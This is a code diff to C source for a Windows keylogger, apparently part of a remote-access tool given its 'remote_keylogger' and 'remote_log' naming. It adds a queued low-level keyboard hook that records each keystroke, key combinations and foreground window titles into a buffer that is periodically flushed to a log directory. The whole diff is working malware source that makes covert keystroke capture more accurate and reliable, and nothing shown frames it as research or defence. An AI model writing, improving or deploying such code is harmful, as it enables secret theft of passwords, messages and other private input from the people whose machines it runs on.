@@ -8,6 +8,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
+#include <ctype.h>
 
 #ifndef WH_KEYBOARD_LL
 #define WH_KEYBOARD_LL 13
@@ -15,7 +16,7 @@
 
 #define KEYLOGGER_BUF_SIZE  (64 * 1024)
 #define KEYLOGGER_FLUSH_MS  15000
-#define KEYLOGGER_MAX_ENTRIES 256
+#define KEYLOGGER_MAX_ENTRIES 1024
 
 static volatile long g_keylogger_running = 0;
 static HANDLE g_keylogger_thread = NULL;
@@ -24,6 +25,35 @@ static char g_logs_dir[MAX_PATH] = { 0 };
 static char* g_keylogger_buf = NULL;
 static size_t g_keylogger_buf_len = 0;
 static char g_last_title[256] = { 0 };
+
+typedef struct _KEYLOG_EVENT {
+    int vk;
+    DWORD scanCode;
+} KEYLOG_EVENT;
+
+static KEYLOG_EVENT g_keylog_queue[KEYLOGGER_MAX_ENTRIES];
+static volatile LONG g_keylog_q_head = 0;
+static volatile LONG g_keylog_q_tail = 0;
+static int g_keylog_q_initialized = 0;
+
+static int is_modifier_vk(int vk) {
+    switch (vk) {
+        case VK_SHIFT:
+        case VK_LSHIFT:
+        case VK_RSHIFT:
+        case VK_CONTROL:
+        case VK_LCONTROL:
+        case VK_RCONTROL:
+        case VK_MENU:      /* Alt */
+        case VK_LMENU:
+        case VK_RMENU:
+        case VK_LWIN:
+        case VK_RWIN:
+            return 1;
+        default:
+            return 0;
+    }
+}
 
 static const char* vk_to_name(int vk) {
     switch (vk) {
@@ -114,6 +144,13 @@ static void append_char(char c) {
 }
 
 static void update_window_title(void) {
+    static DWORD last_check = 0;
+    DWORD now = GetTickCount();
+    if (now - last_check < 200) {
+        return;
+    }
+    last_check = now;
+
     char title[256] = { 0 };
     HWND fg = GetForegroundWindow();
     if (fg && GetWindowTextA(fg, title, (int)(sizeof(title) - 1)) > 0) {
@@ -140,28 +177,145 @@ static void update_window_title(void) {
     }
 }
 
+static void enqueue_key_event(int vk, DWORD scanCode) {
+    if (!g_keylog_q_initialized) return;
+
+    LONG tail = g_keylog_q_tail;
+    LONG head = g_keylog_q_head;
+    LONG next_tail = (tail + 1) % KEYLOGGER_MAX_ENTRIES;
+
+    if (next_tail == head) {
+        /* queue full, drop event */
+        return;
+    }
+
+    g_keylog_queue[tail].vk = vk;
+    g_keylog_queue[tail].scanCode = scanCode;
+    g_keylog_q_tail = next_tail;
+}
+
+static int dequeue_key_events(KEYLOG_EVENT* out, int max_out) {
+    if (!g_keylog_q_initialized || !out || max_out <= 0) return 0;
+
+    int count = 0;
+    LONG head = g_keylog_q_head;
+    LONG tail = g_keylog_q_tail;
+
+    while (head != tail && count < max_out) {
+        out[count++] = g_keylog_queue[head];
+        head = (head + 1) % KEYLOGGER_MAX_ENTRIES;
+    }
+
+    g_keylog_q_head = head;
+
+    return count;
+}
+
+static void process_key_event(const KEYLOG_EVENT* ev) {
+    if (!ev) return;
+
+    /* Do not log pure modifier keys (Shift/Ctrl/Alt/Win), like C# KeyPress behavior. */
+    if (is_modifier_vk(ev->vk)) return;
+
+    update_window_title();
+
+    /* Build keyboard state from global key state (Shift/Caps/AltGr etc.). */
+    BYTE kbd[256];
+    memset(kbd, 0, sizeof(kbd));
+
+    /* Helper lambdas (C-style) to set down/toggle bits. */
+    #define SET_DOWN(vk) \
+        do { if (GetKeyState(vk) & 0x8000) kbd[(vk)] |= 0x80; } while (0)
+    #define SET_TOGGLE(vk) \
+        do { if (GetKeyState(vk) & 0x0001) kbd[(vk)] |= 0x01; } while (0)
+
+    SET_DOWN(VK_SHIFT);
+    SET_DOWN(VK_LSHIFT);
+    SET_DOWN(VK_RSHIFT);
+    SET_DOWN(VK_CONTROL);
+    SET_DOWN(VK_LCONTROL);
+    SET_DOWN(VK_RCONTROL);
+    SET_DOWN(VK_MENU);
+    SET_DOWN(VK_LMENU);
+    SET_DOWN(VK_RMENU);
+    SET_TOGGLE(VK_CAPITAL);
+    SET_TOGGLE(VK_NUMLOCK);
+    SET_TOGGLE(VK_SCROLL);
+
+    wchar_t ch[4] = { 0 };
+    int ret = ToUnicode((UINT)ev->vk, (UINT)ev->scanCode, kbd, ch, 4, 0);
+
+    #undef SET_DOWN
+    #undef SET_TOGGLE
+
+    if (ret > 0 && ch[0] >= 32 && ch[0] < 127) {
+        /* Printable character with current modifiers (e.g. 'a', 'A', '!', etc.). */
+        append_char((char)ch[0]);
+        return;
+    }
+
+    /* Check modifiers for combinations like Ctrl+A, Alt+Tab, etc. */
+    int hasCtrl = (kbd[VK_CONTROL] & 0x80) || (kbd[VK_LCONTROL] & 0x80) || (kbd[VK_RCONTROL] & 0x80);
+    int hasShift = (kbd[VK_SHIFT] & 0x80) || (kbd[VK_LSHIFT] & 0x80) || (kbd[VK_RSHIFT] & 0x80);
+    int hasAlt = (kbd[VK_MENU] & 0x80) || (kbd[VK_LMENU] & 0x80) || (kbd[VK_RMENU] & 0x80);
+    int hasWin = (kbd[VK_LWIN] & 0x80) || (kbd[VK_RWIN] & 0x80);
+
+    /* If Ctrl/Alt/Win is involved, log a combo like [Ctrl+A], [Alt+Tab]. */
+    if (hasCtrl || hasAlt || hasWin) {
+        char combo[128];
+        combo[0] = '\0';
+
+        strcat_s(combo, sizeof(combo), hasCtrl ? "Ctrl+" : "");
+        if (hasShift) strcat_s(combo, sizeof(combo), "Shift+");
+        if (hasAlt) strcat_s(combo, sizeof(combo), "Alt+");
+        if (hasWin) strcat_s(combo, sizeof(combo), "Win+");
+
+        /* Base key name/char */
+        const char* baseName = vk_to_name(ev->vk);
+        char base[32];
+        if (baseName && !is_modifier_vk(ev->vk)) {
+            strncpy_s(base, sizeof(base), baseName, _TRUNCATE);
+        } else {
+            UINT mapped = MapVirtualKeyA((UINT)ev->vk, MAPVK_VK_TO_CHAR);
+            if (mapped >= 32 && mapped < 127) {
+                base[0] = (char)mapped;
+                base[1] = '\0';
+            } else {
+                _snprintf_s(base, sizeof(base), _TRUNCATE, "VK%u", (unsigned)ev->vk);
+            }
+        }
+
+        strcat_s(combo, sizeof(combo), base);
+
+        char wrapped[160];
+        _snprintf_s(wrapped, sizeof(wrapped), _TRUNCATE, "%s", combo);
+        append_key(wrapped);
+        return;
+    }
+
+    /* No Ctrl/Alt/Win: treat as plain key. First, try to get a printable char. */
+    UINT mapped = MapVirtualKeyA((UINT)ev->vk, MAPVK_VK_TO_CHAR);
+    if (mapped >= 32 && mapped < 127) {
+        append_char((char)mapped);
+        return;
+    }
+
+    /* Still not printable: log by friendly name (Enter, Tab, arrows, etc.) or VK code. */
+    const char* name = vk_to_name(ev->vk);
+    if (name) {
+        append_key(name);
+    } else {
+        char vkstr[16];
+        _snprintf_s(vkstr, sizeof(vkstr), _TRUNCATE, "VK%u", (unsigned)ev->vk);
+        append_key(vkstr);
+    }
+}
+
 static LRESULT CALLBACK low_level_kb_proc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
         KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
         int vk = (int)p->vkCode;
-        update_window_title();
-        const char* name = vk_to_name(vk);
-        if (name) {
-            if (name[0] == ' ') append_char(' ');
-            else append_key(name);
-        } else {
-            BYTE kbd[256] = { 0 };
-            GetKeyboardState(kbd);
-            wchar_t ch[4] = { 0 };
-            if (ToUnicode((UINT)vk, (UINT)(p->scanCode), kbd, ch, 4, 0) > 0 && ch[0]) {
-                if (ch[0] >= 32 && ch[0] < 127) append_char((char)ch[0]);
-                else append_key("?");
-            } else {
-                char vkstr[16];
-                _snprintf_s(vkstr, sizeof(vkstr), _TRUNCATE, "VK%u", (unsigned)vk);
-                append_key(vkstr);
-            }
-        }
+        enqueue_key_event(vk, p->scanCode);
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
@@ -210,6 +364,8 @@ static DWORD WINAPI keylogger_thread_proc(LPVOID param) {
     }
     remote_log("[keylogger] hook installed, dir=%s", g_logs_dir);
     DWORD last_flush = GetTickCount();
+    KEYLOG_EVENT ev_batch[KEYLOGGER_MAX_ENTRIES];
+
     MSG msg;
     while (InterlockedCompareExchange(&g_keylogger_running, 1, 1) == 1) {
         while (PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE)) {
@@ -217,7 +373,13 @@ static DWORD WINAPI keylogger_thread_proc(LPVOID param) {
             TranslateMessage(&msg);
             DispatchMessageA(&msg);
         }
-        Sleep(50);
+
+        int ev_count = dequeue_key_events(ev_batch, KEYLOGGER_MAX_ENTRIES);
+        for (int i = 0; i < ev_count; i++) {
+            process_key_event(&ev_batch[i]);
+        }
+
+        Sleep(5);
         DWORD now = GetTickCount();
         if (now - last_flush >= KEYLOGGER_FLUSH_MS) {
             last_flush = now;
@@ -245,10 +407,16 @@ int remote_keylogger_start(const char* logs_dir) {
     }
     g_keylogger_buf_len = 0;
     g_last_title[0] = '\0';
+
+    g_keylog_q_head = 0;
+    g_keylog_q_tail = 0;
+    g_keylog_q_initialized = 1;
+
     g_keylogger_thread = CreateThread(NULL, 0, keylogger_thread_proc, NULL, 0, NULL);
     if (!g_keylogger_thread) {
         HeapFree(GetProcessHeap(), 0, g_keylogger_buf);
         CloseHandle(g_keylogger_mutex);
+        g_keylog_q_initialized = 0;
         InterlockedExchange(&g_keylogger_running, 0);
         return 0;
     }
@@ -263,6 +431,9 @@ void remote_keylogger_stop(void) {
         WaitForSingleObject(g_keylogger_thread, 5000);
         CloseHandle(g_keylogger_thread);
         g_keylogger_thread = NULL;
+    }
+    if (g_keylog_q_initialized) {
+        g_keylog_q_initialized = 0;
     }
     if (g_keylogger_buf) {
         HeapFree(GetProcessHeap(), 0, g_keylogger_buf);
